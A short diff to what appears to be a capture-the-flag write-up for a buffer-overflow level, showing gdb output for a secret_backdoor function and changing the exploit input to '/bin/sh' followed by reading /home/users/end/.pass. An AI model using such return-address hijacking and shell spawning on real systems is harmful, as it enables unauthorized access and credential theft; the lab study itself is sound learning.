@@ -87,4 +87,6 @@ Then we overwrite the saved RIP with the address of secret_backdoor. We get the 
 (gdb) p secret_backdoor
 $1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
 
-secret_backdoor reads a line from stdin and passes it to system so we provide ` cat /home/users/end/.pass\n `.
+secret_backdoor reads a line from stdin and passes it to system so we provide ` /bin/sh\n `.
+
+Then in the opened bash we pass `cat /home/users/end/.pass`
